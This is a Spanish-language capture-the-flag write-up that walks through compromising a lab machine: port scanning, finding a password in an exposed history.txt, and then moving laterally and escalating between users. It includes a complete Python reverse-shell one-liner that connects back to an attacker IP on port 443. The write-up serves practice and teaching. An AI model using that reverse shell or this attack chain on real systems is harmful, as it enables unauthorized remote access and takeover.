# Máquina

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80,7777 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

### Fuzzing web

hice fuzzing web con gobuster pero no encontré nada más que el index.php

como podemos ver tenemos un servidor http con python levantado por el puerto 7777, entramos por la url a ese puerto, hay un directorio secret y dentro de este hay un archivo history.txt, lo descargué y visualicé una contraseña.

![alt text](image-3.png)


![alt text](image-2.png)

entro en http://172.17.0.2

![alt text](image-5.png)

y escribo la contraseña encontrada

![alt text](image-4.png)

me arrojó a esta vista

![alt text](image-6.png)

### Intrusión

Como me permite crear scripts entonces cree una reverse shell y la ejecuté.

reverse shell en python:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

![alt text](image-8.png)

me puse en escucha con netcat por el puerto 443

![alt text](image-7.png)


![alt text](image-9.png)

tratamiento de la tty

vi los usuarios del sistema:

![alt text](image-10.png)

Cambiar al usuario codebad

en /home/codebad/secret encontré un archivo adivinanza.txt

![alt text](image-11.png)

lo que me hizo asumir que malware es la contraseña de codebad

siendo el usuario codebad

![alt text](image-12.png)

ejecuté

![alt text](image-13.png)

me puse en escucha con netcat por el puerto 4445

![alt text](image-14.png)

ahora soy el usuario metadata

### Escalar privilegios

Siendo el usuario metadata ejecuté, para ver permisos de ejecución sobre que archivos tenía

find / -type f -perm -o+x 2>/dev/null

y hay /usr/local/bin/metadatosmalos

entonces asumí que la contraseña del usuario metadata es metadatosmalos

![alt text](image-15.png)